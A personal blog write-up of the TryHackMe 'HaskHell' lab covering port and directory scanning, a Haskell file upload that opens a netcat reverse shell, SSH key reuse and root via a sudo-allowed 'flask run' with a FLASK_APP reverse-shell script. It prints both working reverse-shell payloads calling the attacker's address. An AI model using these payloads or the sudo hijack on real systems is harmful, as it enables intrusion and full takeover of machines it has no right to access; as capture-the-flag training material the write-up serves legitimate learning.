---
title: "TryHackMe - HaskHell"
author: Nasrallah
description: ""
date: 2022-12-19 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, haskell, python, flask, sudo, hijacking]
img_path: /assets/img/tryhackme/haskhell
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [HaskHell](https://tryhackme.com/room/haskhell) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.217.150                                             
Host is up (0.15s latency).                                                    
Not shown: 998 closed tcp ports (reset)                                                                                                                       
PORT     STATE SERVICE VERSION                                                 
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)         
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)                
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)              
5001/tcp open  http    Gunicorn 19.7.1                                                                                                                        
|_http-title: Homepage                                                         
|_http-server-header: gunicorn/19.7.1                                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
```

We found two open ports, 22 running OpenSSH and 5001 running Gunicorn http web server.

## Web

Let's navigate to the web page on port 5001.

![](1.png)

This is the home page for the Haskell programming course, and we see that it provides a link to a homework.

![](2.png)

Here we can see the homework assignment, the professor provided a link to submit the solution.

We can see that only Haskell files are accepted, and once uploaded, they will be compiled and ran.

When we go to the upload link we get a 404, the professor must have included the wrong directory.

### Gobuster

Let's run a directory scan to find the upload page.

```terminal
└──╼ $ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.217.150:5001/ | tee gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.217.150:5001/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/21 07:38:51 Starting gobuster in directory enumeration mode
===============================================================
/submit               (Status: 200) [Size: 237]
                                                
===============================================================
```

Great! We found the page.

![](3.png)

# **Foothold**

Now we can upload the following haskell code that would give us a reverse shell.

```terminal
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 10.18.0.188 9001 >/tmp/f"
```


> Found the code above in https://www.revshells.com/

After setting up a listener and uploading the file, we successfully receive a shell.

![](4.png)


# **Privilege Escalation**

Checking other users' home directories, we find an ssh private key of `prof` user.

![](5.png)

Let's copy that to our machine and connect with it via ssh.

![](6.png)

Now let's check our current privileges with `sudo -l`.

```bash
$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
```

We can run flask as root. Let's run it and see what happens.

```terminal
$ sudo /usr/bin/flask run
Usage: flask run [OPTIONS]
                                       
Error: Could not locate Flask application. You did not provide the FLASK_APP environment variable.
                                       
For more information see http://flask.pocoo.org/docs/latest/quickstart/
```

We got an error saying that we did not provide the FLASK_APP environment variable.

So i created a python script that would send us a reverse shell and set it as the environment variable, i set up a listener and run flask again.

```bash
$ cat shell.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.0.188",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")

$ export FLASK_APP=shell.py

$ sudo /usr/bin/flask run
```

![](8.png)

Congrats, we've rooted the machine.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
